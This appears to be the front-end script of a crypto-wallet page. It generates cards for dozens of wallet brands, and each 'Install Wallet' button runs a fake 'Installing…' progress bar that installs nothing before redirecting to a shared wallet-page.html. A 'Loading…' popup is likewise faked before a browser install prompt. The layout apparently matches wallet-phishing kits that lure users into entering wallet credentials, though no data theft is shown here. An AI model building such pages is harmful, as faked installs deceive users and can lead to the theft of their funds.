console.log("Wallets page loaded!");

// Final clean wallet list (no duplicates)
const wallets = [
  "Meta Mask",
  "Poloniex",
  "Trust",
  "Solflare",
  "WalletConnect",
  "Terra",
  "Bitpay",
  "Maiar",
  "MyKey",
  "Atwallet",
  "Authereum",
  "Bitfrost",
  "Coinbase1",
  "Coinomi",
  "Dcent",
  "Easypocket",
  "Ledger",
  "Coolwallet",
  "Cybavowallet",
  "Coin98",
  "Harmony",
  "PeakDefi",
  "Gridplus",
  "VIA",
  "Imtoken",
  "Infinito",
  "Infinity",
  "Kadachain",
  "Keplr",
  "Midas1",
  "Marixwallet",
  "Midas2",
  "Nash",
  "Onto",
  "Ownbit",
  "Pillar",
  "Rainbow",
  "Safepal",
  "Sollet",
  "Spark",
  "Spatium",
  "Tokenary",
  "Tokenpocket",
  "Tomo",
  "Torus",
  "Coinbase2",
  "XDC",
  "Walletio",
  "Walleth",
  "Zelcore",
  "Phantom",
  "Exodus",
  "Binance",
  "Bitget",
  "Other Wallets",
];

const container = document.getElementById("walletContainer");

// Generate cards
wallets.forEach((name) => {
  let imageName =
    name
      .toLowerCase()
      .replace(/\s+/g, "")
      .replace(/'/g, "")
      .replace(/\./g, "")
      .replace(/-/g, "")
      .replace(/\//g, "") + ".webp";

  // "Other Wallets" without main icon
  if (name.toLowerCase().includes("other")) {
    container.innerHTML += `
      <div class="wallet-card">
        <p>${name}</p>

        <div style="display:flex; justify-content:center; gap:18px; margin-top:12px;">
            <img src="assets/icons/downloads.png" 
                 onclick="showPWAPopup()" 
                 style="width:35px; cursor:pointer;">

            <img src="assets/icons/rocket.png" 
                 onclick="openWallet('${name}')" 
                 style="width:35px; cursor:pointer;">
        </div>

      </div>
    `;
    return;
  }

  // Normal wallet card
  container.innerHTML += `
    <div class="wallet-card">
      <img src="wallet-icons/${imageName}" alt="${name}">
      <p>${name}</p>

    <div class="icon-row">
    <div class="icon-btn download-btn" onclick="installWallet('${name}')">
        <img src="assets/icons/downloads.png">
        <span>Install Wallet</span>
    </div>

    <div class="icon-btn rocket-btn" onclick="openWallet('${name}')">
        <img src="assets/icons/rocket.png">
        <span>Open Wallet</span>
    </div>
</div>
<div class="icon-btn download-btn" onclick="installWallet('${name}')">



    </div>
  `;
});

// Open wallet page
function openWallet(walletName) {
  window.location.href = `wallet-page.html?wallet=${walletName}`;
}

/* ---------------------------
   PWA INSTALL + POPUP LOGIC
----------------------------- */

let deferredPrompt = null;

// Store install event
window.addEventListener("beforeinstallprompt", (e) => {
  e.preventDefault();
  deferredPrompt = e;
});

// Show popup with progress loader
function showPWAPopup() {
  if (!/Android|iPhone/i.test(navigator.userAgent)) {
    alert("This feature only works on mobile.");
    return;
  }

  document.getElementById("pwaPopup").style.display = "flex";

  let progress = 0;
  let interval = setInterval(() => {
    progress++;
    document.getElementById("progressText").innerText = `Loading… ${progress}%`;
    document.getElementById("progressFill").style.width = progress + "%";

    if (progress >= 100) {
      clearInterval(interval);
      document.getElementById("installBtn").style.display = "block";
    }
  }, 40);
}

// Install button pressed
document.getElementById("installBtn").onclick = async () => {
  if (deferredPrompt) {
    deferredPrompt.prompt();
    deferredPrompt = null;
  }
};

// Close popup
function closePopup() {
  document.getElementById("pwaPopup").style.display = "none";
}
function installWallet(walletName) {
  let progress = 0;
  document.getElementById("pwaPopup").style.display = "flex";

  let interval = setInterval(() => {
    progress++;
    document.getElementById(
      "progressText"
    ).innerText = `Installing… ${progress}%`;
    document.getElementById("progressFill").style.width = progress + "%";

    if (progress >= 100) {
      clearInterval(interval);

      document.getElementById("progressText").innerText = "Done!";
      document.getElementById("progressFill").style.width = "100%";

      setTimeout(() => {
        closePopup();
        openWallet(walletName); // ← Wallet auto open
      }, 700);
    }
  }, 40);
}
